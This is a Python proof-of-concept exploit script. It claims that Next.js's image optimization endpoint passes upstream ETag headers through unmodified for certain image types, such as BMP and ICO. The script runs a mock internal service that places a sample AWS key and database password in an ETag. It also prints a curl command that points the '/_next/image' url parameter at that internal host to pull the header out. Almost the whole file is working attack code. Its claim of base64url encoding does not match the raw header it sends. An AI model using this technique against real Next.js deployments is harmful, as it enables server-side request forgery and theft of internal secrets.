#!/usr/bin/env python3
"""
ETag Data Exfiltration PoC - Using BYPASS_TYPES
================================================

For BYPASS_TYPES (SVG, ICO, ICNS, BMP, JXL, HEIC), Next.js returns
the upstream ETag without modification!

The ETag header from internal service is base64url encoded and 
returned to the attacker - enabling data exfiltration!
"""

from http.server import HTTPServer, BaseHTTPRequestHandler

SECRET = "AWS_KEY=AKIAIOSFODNN7EXAMPLE&DB_PASS=supersecret123"

# Minimal valid ICO file (16x16, 1 bit)
ICO_HEADER = bytes([
    0x00, 0x00,  # Reserved
    0x01, 0x00,  # Type: ICO
    0x01, 0x00,  # Number of images: 1
    # Image entry
    0x01,        # Width: 1
    0x01,        # Height: 1
    0x00,        # Color palette: 0
    0x00,        # Reserved
    0x01, 0x00,  # Color planes
    0x01, 0x00,  # Bits per pixel
    0x30, 0x00, 0x00, 0x00,  # Size of image data
    0x16, 0x00, 0x00, 0x00,  # Offset to image data
])

# Minimal BMP data
BMP_DATA = b'BM' + b'\x00' * 50

class EtagExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"\n[EXFIL] Request received: {self.path}")
        print(f"[EXFIL] Returning BMP with secret in ETag header")
        print(f"[EXFIL] Secret in ETag: {SECRET}")
        
        # Use BMP - it's a BYPASS_TYPE
        data = BMP_DATA
        
        self.send_response(200)
        self.send_header('Content-Type', 'image/bmp')
        self.send_header('Content-Length', len(data))
        # Put the secret in the ETag header!
        self.send_header('ETag', f'"{SECRET}"')
        self.end_headers()
        self.wfile.write(data)
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    port = 9997
    print("=" * 60)
    print(" ETag Data Exfiltration PoC (BYPASS_TYPES)")
    print("=" * 60)
    print(f"\nListening on 127.0.0.1:{port}")
    print(f"\nSecret in ETag: {SECRET}")
    print("\nBMP is a BYPASS_TYPE - ETag returned unmodified!")
    print("=" * 60)
    print("\nTest with:")
    print(f'  curl -v "http://localhost:3000/_next/image?url=http://127.0.0.1:{port}/secret.bmp&w=64&q=75" 2>&1 | grep -i etag')
    print("\nThen decode the base64url ETag to get the secret!")
    print("=" * 60)
    
    HTTPServer(('127.0.0.1', port), EtagExfilHandler).serve_forever()
